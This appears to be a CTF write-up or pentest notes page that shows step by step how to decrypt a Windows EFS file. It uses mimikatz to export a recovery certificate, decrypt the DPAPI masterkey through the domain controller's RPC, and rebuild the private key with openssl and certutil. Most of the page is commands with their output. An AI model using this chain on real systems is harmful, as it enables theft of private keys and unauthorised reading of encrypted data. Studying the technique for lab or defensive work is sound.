## What is?
EFS is designed to encrypt individual files or folders to prevent unauthorized users from accessing sensitive information. It is commonly used to safeguard data on laptops and desktops, especially for files that are confidential or sensitive.

## How to check if a file is encrypted?     
```
cipher /c "C:\users\Robert.Lanza\Desktop\VPN\otp.png"

 Listing C:\users\Robert.Lanza\Desktop\VPN\
 New files added to this directory will not be encrypted.
E otp.png
  Compatibility Level:
    Windows XP/Server 2003
  Users who can decrypt:
    inception\Robert.Lanza [Robert.Lanza(Robert.Lanza@inception.local)]
    Certificate thumbprint: 54A1 25B3 FAEE AFE7 C754 6165 C4E7 7DD8 7D3B F0E1 
  Recovery Certificates:
    Administrator@cyber.local
    Certificate thumbprint: 43EC C04D 4ED3 A29E AEF3 86C1 4C6B 650D CD4E 1BD8 
  Key information cannot be retrieved.
```
(E=encrypted  

## How to decrypt?
You need to have installed the certificate that matches the thumbprint from the previous step.

### Example
In one ctf I had to decrypt one file but the main certificate was gone from the system and I had to retrive the recover certificate from the main DC(**where the Administrator@cyber.local existed)**. The problem is that the private-key need to be exported as well and it the "Allow exporting of the private-key" isn't enabled then you can't do by traditional matters and you need to use mimikatz.
1)Checked that the certificate is on the system
```
PS C:\Temp> Get-ChildItem -path 'Cert:\*43ECC04D4ED3A29EAEF386C14C6B650DCD4E1BD8' -Recurse | fl
Subject      :
Issuer       : CN=Cyber-CA, DC=cyber, DC=local
Thumbprint   : 43ECC04D4ED3A29EAEF386C14C6B650DCD4E1BD8
FriendlyName : EFS-DRA
NotBefore    : 7/30/2020 11:37:16 PM
NotAfter     : 7/30/2022 11:47:16 PM
Extensions   : {System.Security.Cryptography.Oid, System.Security.Cryptography.Oid, System.Security.Cryptography.Oid,
               System.Security.Cryptography.Oid...}
```
2)Exporting the public key via mimikatz. OBS: the Key Container is what we need!
```
mimikatz # crypto::system /file:"C:\Users\Administrator\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates\43E
CC04D4ED3A29EAEF386C14C6B650DCD4E1BD8" /export
<SNIP>
[0002/1] KEY_PROV_INFO_PROP_ID
  Provider info:
        Key Container  : te-CYEFSR-a2787189-b92a-49d0-b9dc-cf99786635ab
<SNIP>
 Saved to file: 43ECC04D4ED3A29EAEF386C14C6B650DCD4E1BD8.der
```
3)List all the available(hidden) containers. OBS: private-keys are not chained to containers names so you need to fuzz manually for the right one.
```
S C:\Users\Administrator\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-2011815209-557191040-1566801441-500> ls
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a--s-        1/13/2024   2:01 AM           2093 58eb241fdd2b4e1090296fade9a42768_cd42b893-122c-49c3-85da-c5fff1b0a3ad
-a--s-       10/23/2021   6:51 AM           2093 6426b8537422b15803a290a9f5a9509e_cd42b893-122c-49c3-85da-c5fff1b0a3ad
-a--s-         6/2/2020  11:10 PM           2093 88fdd6a8e33094019ece59ea1c41bc08_cd42b893-122c-49c3-85da-c5fff1b0a3ad
-a--s-       12/31/2019   1:23 AM           2081 93022dca71c34e50b848af0196941664_cd42b893-122c-49c3-85da-c5fff1b0a3ad
-a--s-        2/13/2023  12:57 PM           2093 e603773d96d0363df29c36ecc5039650_cd42b893-122c-49c3-85da-c5fff1b0a3ad
-a--s-        1/20/2021   1:26 AM           2091 ed6c2461ca931510fc7d336208cb40b5_cd42b893-122c-49c3-85da-c5fff1b0a3ad
```
4)Now we need to find manually the right container  OBS: "**pUniqueName**" is the match from step 2!
```
mimikatz # dpapi::capi /in:"C:\Users\Administrator\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-2011815209-557191040-1566801441-500\ed6c2461ca931510fc7d336208cb40b5_cd42b893-122c-49c3-85da-c5fff1b0a3ad"
<SNIP>
pUniqueName        : te-CYEFSR-a2787189-b92a-49d0-b9dc-cf99786635ab
<SNIP>
    guidMasterKey      : {f216eabc-73af-45dc-936b-babe7ca8ed05}
<SNIP>
```

5)Take the "**guidMasterKey**" and find it on the system
```
PS C:\Users\Administrator\AppData\Roaming\Microsoft\Protect\S-1-5-21-2011815209-557191040-1566801441-500> ls -ah
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a-hs-        1/27/2022  12:38 AM            740 058b509a-b1a7-4f9e-ab37-d7c47dcfdad3
-a-hs-       12/31/2019   1:23 AM            468 6f2a4414-dcb9-4a57-8d60-c35bdf66e4f7
-a-hs-        6/17/2020   8:32 AM            740 716d23c4-a63b-4448-a876-9604d98c06cc
-a-hs-       10/23/2021   6:51 AM            740 a9b0afa2-28af-4fdf-b5b0-d4334ece9c99
-a-hs-        3/18/2020  10:23 PM            904 BK-CYBER
-a-hs-        3/18/2020  10:23 PM            740 c5f5331e-5856-40b9-82cc-8c090fe15641
-a-hs-        6/27/2024   4:02 AM            740 cdaf0a55-c234-41d4-a6f5-0b044b94f76f
-a-hs-        1/13/2024   2:01 AM            740 f045138c-67a2-479f-8a33-717dfa0bfa0b
-a-hs-        2/13/2023  12:57 PM            740 f1237474-8406-44b2-97e7-18194e43cfc7
-a-hs-        1/15/2021   7:40 AM            740 f216eabc-73af-45dc-936b-babe7ca8ed05
-a-hs-        6/27/2024   4:02 AM             24 Preferred
```

6)Now that you see the **masterkey** is there you can try to decrypt the master key.
Here you need either **/password: (password of the user)** or **/hash: (ntlm hash)**    
OBS: if none works because you get `kuhl_mdpapi_master_key error` then you can try using just:
**/rpc:** it can be used to remotely decrypt the masterkey of the target user by contacting the domain controller. According to Benjamin, in a domain, a domain controller runs an RPC Service to deal with encrypted masterkeys for users, MS-BKRP (Backupkey Remote Protocol).
```
mimikatz # dpapi::masterkey /in:"C:\Users\Administrator\AppData\Roaming\Microsoft\Protect\S-1-5-21-2011815209-557191040-1566801441-500\f216eabc-73af-45dc-936b-babe7ca8ed05" /rpc
<SNIP>
[domainkey] with RPC
[DC] 'cyber.local' will be the domain
[DC] 'cydc.cyber.local' will be the DC server
  key : 40fcaaf0f3d80955bd6b4a57ba5a3c6cd21e5728bcdfa5a4606e1bf0a452d74ddb4e222b71c1c3be08cb4f337f32e6250576a2d105d30ff7164978280180567e
  sha1: 81a2357b28e004f3df2f7c29588fbd8d650f5e70
```

7)Use the sha1 hash of the master-key to decrypt the actual private-key from step 4
```
mimikatz # dpapi::capi /in:"C:\Users\Administrator\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-2011815209-557191040-1566801441-500\ed6c2461ca931510fc7d336208cb40b5_cd42b893-122c-49c3-85da-c5fff1b0a3ad" /masterkey:"81a2357b28e004f3df2f7c29588fbd8d650f5e70"
<SNIP>
        Exportable key : YES
        Private export : OK - 'dpapi_exchange_capi_0_te-CYEFSR-a2787189-b92a-49d0-b9dc-cf99786635ab.keyx.rsa.pvk'
```

8)Now generate the right certificate with both public/priv keys in the chain(Linux friendly!)
```
openssl x509 -inform DER -outform PEM -in 43ECC04D4ED3A29EAEF386C14C6B650DCD4E1BD8.der -out public.pem 
openssl rsa -inform PVK -outform PEM -in dpapi_exchange_capi_0_te-CYEFSR-a2787189-b92a-49d0-b9dc-cf99786635ab.keyx.rsa.pvk -out private.pem 
openssl pkcs12 -in public.pem -inkey private.pem -password pass:Coglione1! -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

```

9)Import the .pfx from step 8 onto the session where you want to decrypt the efs:
```
certutil -user -p "Coglione1!" -importpfx cert.pfx NoChain,NoRoot
Certificate "Administrator@cyber.local" added to store.
```

10)Enjoy! Now you should be able to read the file freely!

